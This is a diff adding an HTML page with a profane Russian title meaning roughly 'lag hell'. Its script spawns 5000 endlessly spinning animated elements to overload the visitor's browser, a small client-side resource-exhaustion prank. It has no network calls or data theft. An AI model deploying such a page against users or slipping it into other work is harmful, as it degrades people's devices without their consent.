@@ -1,1 +1,22 @@
-
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <title>Пиздец Лагов</title>
+    <style>
+        body { margin: 0; overflow: hidden; background: black; }
+        .fuck { position: absolute; width: 20px; height: 20px; background: red; animation: kill 0.1s infinite linear; }
+        @keyframes kill { 100% { transform: translate(100vw, 100vh) rotate(3600deg); } }
+    </style>
+</head>
+<body>
+    <script>
+        for (let i = 0; i < 5000; i++) {
+            let div = document.createElement("div");
+            div.className = "fuck";
+            div.style.left = Math.random() * window.innerWidth + "px";
+            div.style.top = Math.random() * window.innerHeight + "px";
+            document.body.appendChild(div);
+        }
+    </script>
+</body>
+</html>
